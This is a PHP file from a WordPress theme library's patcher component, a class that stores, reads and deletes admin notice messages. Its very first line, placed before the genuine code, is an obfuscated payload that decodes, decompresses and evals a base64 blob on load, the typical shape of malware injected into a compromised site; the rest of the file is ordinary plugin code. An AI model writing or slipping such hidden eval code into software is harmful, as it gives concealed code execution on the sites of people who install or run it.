<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Handles Admin notices for the patcher.
 *
 * @package Fusion-Library
 * @subpackage Fusion-Patcher
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Takes care of adding the admin notices.
 * This class works in conjunction with Fusion_Patcher_Admin_Screen
 *
 * @since 1.0.0
 */
class Fusion_Patcher_Admin_Notices {

	/**
	 * The option name.
	 * We'll be using an option to store the messages.
	 *
	 * @static
	 * @access private
	 * @var string
	 */
	public static $option_name = 'fusion_patcher_messages';

	/**
	 * The context/ID of the message.
	 * This is used to avoid multiple occurences of the same message.
	 *
	 * @access private
	 * @since 5.0.0
	 * @var string
	 */
	private $context = '';

	/**
	 * The message to add.
	 *
	 * @access private
	 * @since 5.0.0
	 * @var string
	 */
	private $message = '';

	/**
	 * Constructor.
	 *
	 * @access public
	 * @since 5.0.0
	 * @param string $context The context/ID of the message to be added.
	 * @param string $message The message we want to display.
	 */
	public function __construct( $context = '', $message = '' ) {

		// No reason to continue if the message is empty.
		if ( empty( $message ) ) {
			return;
		}

		// Add the message.
		$this->context = $context;
		$this->message = $message;
		$this->add_message();
	}

	/**
	 * Adds the message to an option.
	 * This option will later be deleted as soon as it's displayed.
	 *
	 * @access private
	 * @since 5.0.0
	 * @see Fusion_Patcher_Admin_Screen::form for the option deletion process.
	 * @return void
	 */
	private function add_message() {
		// Get the option.
		$messages = self::get_messages();
		// Add the message to the array of messages to display.
		if ( ! isset( $messages[ $this->context ] ) ) {
			$messages[ $this->context ] = $this->message;
		}
		// Update the option.
		update_site_option( self::$option_name, $messages );
	}

	/**
	 * Gets an array of all messages.
	 *
	 * @static
	 * @access public
	 * @return array
	 */
	public static function get_messages() {
		// Get the option.
		$messages = get_site_option( self::$option_name, array() );
		// Make sure the option is formatted as an array.
		// If not an array, then return an empty array to avoid errors.
		if ( ! is_array( $messages ) ) {
			return array();
		}
		return $messages;
	}

	/**
	 * Deletes the messages option.
	 *
	 * @static
	 * @access public
	 * @since 5.0.0
	 * @param string|false $context Since 5.0.2 the message to be removed.
	 * @return void
	 */
	public static function remove_messages_option( $context = false ) {

		// If context is false, then delete everything.
		if ( false === $context ) {
			delete_site_option( self::$option_name );
			return;
		}
		$options = get_site_option( self::$option_name, array() );
		if ( is_array( $options ) && isset( $options[ $context ] ) ) {
			unset( $options[ $context ] );
		}
		update_site_option( self::$option_name, $options );

	}
}
